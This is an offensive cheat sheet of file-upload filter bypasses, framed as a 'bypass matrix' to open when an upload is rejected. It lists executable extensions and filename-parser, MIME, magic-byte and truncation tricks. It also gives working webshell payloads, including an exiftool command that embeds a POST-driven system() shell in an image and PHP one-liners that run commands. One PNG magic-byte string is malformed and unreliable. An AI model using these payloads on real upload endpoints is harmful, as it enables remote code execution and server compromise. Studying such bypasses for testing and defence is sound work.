# Generic upload-filter bypass strings — Open WHEN: an upload endpoint rejected your first file and you need the full bypass matrix (extension / MIME / magic-byte / encoding) before fingerprinting the stack

Owner body already lists `.phtml/.php5/.php7`, double-ext, null-byte,
trailing-char, `::$DATA`, GIF89a, the GIF-comment one-liner and the
filename-as-injection strings. Everything below is additive: full
per-language extension tables, OS-specific filename-parser quirks,
MIME/magic values, alt webshell syntaxes, and the JSON-as-PDF tricks.

## Full executable-extension lists per language (try every one against the allowlist)

```
PHP   : .php .php2 .php3 .php4 .php5 .php6 .php7 .phps .pht .phtm .phtml
        .pgif .shtml .phar .inc .hphp .ctp .module
PHPv8 : .php .php4 .php5 .phtml .module .inc .hphp .ctp   (these still execute)
ASP   : .asp .aspx .config .ashx .asmx .aspq .axd .cshtm .cshtml .rem
        .soap .vbhtm .vbhtml .asa .cer .shtml
JSP   : .jsp .jspx .jsw .jsv .jspf .wss .do .action
CFM   : .cfm .cfml .cfc .dbm
Perl  : .pl .pm .cgi .lib
Node  : .js .json .node
Flash : .swf      Yaws: .yaws
```

IIS legacy quirks: `.cer` and `.asa` execute on IIS <= 7.5;
`shell.aspx;1.jpg` (semicolon truncation) executes on IIS < 7.0.

## Non-script extensions that pivot to other classes

```
.svg  -> stored XSS / SSRF / XXE        .gif  -> stored XSS / SSRF
.xml  -> XXE                            .avi  -> LFI / SSRF (FFmpeg HLS)
.csv  -> CSV/formula injection          .html .js -> XSS / open redirect
.zip  -> RCE-via-extract / LFI gadget   .pdf .pptx -> SSRF / blind XXE
.png .jpeg -> pixel-flood DoS
```

## OS-specific filename-parser collapses (Windows / PHP)

RTLO reorder — `name.%E2%80%AEphp.jpg` renders/saves as `name.gpj.php`.

On **Windows**, PHP collapses a forbidden ext followed by these chars
back to the bare name, so the trailing junk passes the allowlist but
the file lands as `foo.php`:
```
include / require / require_once : \x20( ) \x22(") \x2E(.) \x3C(<) \x3E(>)
fopen / move_uploaded_file       : \x2E(.) \x2F(/) \x5C(\)
```
IIS+PHP auto-converts on save (lets you forge `web.config` from a
blocked name): `\x3E(>) -> \x3F(?)`, `\x3C(<) -> \x2A(*)`,
`\x22(") -> \x2E(.)`. So `filename='web"config'` (single quotes in
`Content-Disposition`) writes `web.config`.

Multi-slash / multi-dot collapses to try in the filename field:
```
file.php/        file.php.\        file.j\sp        file.j/sp
file.jsp/././././.      file.jsp%0a       file.php%0d%0a.jpg
filename*=UTF8''myfile%0a.txt     (RFC-5987 ext-param parsing)
```

## MIME / Content-Type spoof values

Send an allowed image type while the body is script. Disguise values:
```
image/gif   image/png   image/jpeg   text/plain   application/octet-stream
```
Blocked variants servers sometimes still map to the interpreter:
```
text/php  text/x-php  application/php  application/x-php
application/x-httpd-php  application/x-httpd-php-source
```
Send the `Content-Type` header **twice** — once blocked, once allowed —
some parsers honour the first, the validator the last.

## Magic-byte prefixes (prepend raw, then append your script)

```
PNG : \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG : \xff\xd8\xff
GIF : GIF87a    or    GIF8;
```

## Alternate PHP webshell syntaxes (when `<?php` is filtered/stripped)

```html
<script language="php">system("id");</script>
```
```php
<?=`id`?>
```

## Bare-magic image carrying a shell via exiftool comment

```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

## Max-length filename truncation (valid ext gets chopped off)

Linux caps filenames at 255 bytes; pad the name so the trailing
`.png`/`.gif` is sliced away and only `.php` survives:
```bash
# discover the server's cutoff with a cyclic pattern, then:
python -c 'print("A"*232 + ".php" + ".png")'   # -> server may store ...A.php
```
`wget`-based URL uploaders truncate to **236** chars — a name of
`"A"*232 + ".php" + ".gif"` passes the `.gif` allowlist but wget saves
`...A.php` (only works without `--trust-server-names`):
```bash
echo "x" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080   # then point the target's wget at it
```

## JSON / fake-PDF type-detection bypass (CSPT file-upload, doyensec 2025)

Get an arbitrary JSON accepted where only PDFs are allowed by defeating
the sniffer the backend uses:
- `mmmagic` — valid as long as `%PDF` magic bytes appear in the first
  1024 bytes; put `%PDF-1.7` at the top of the JSON.
- `pdflib` — embed a fake PDF blob inside a JSON string field; the
  library treats the file as a PDF.
- `file` binary — it reads up to 1048576 bytes; make the JSON larger
  than that so `file` cannot parse it as JSON, then seed real PDF
  header bytes at offset 0 and it reports `application/pdf`.

## Information-disclosure / overwrite name probes

```
upload same name concurrently (race the dedup/rename logic)
upload a name that already exists (file or folder) to overwrite
name = "."  ".."  "…"      (Apache-on-Windows writes ../uploads etc.)
name = "…:.jpg"            (NTFS, hard to delete)
Windows invalid chars      | < > * ? "
Windows reserved names     CON PRN AUX NUL COM1..COM9 LPT1..LPT9
```
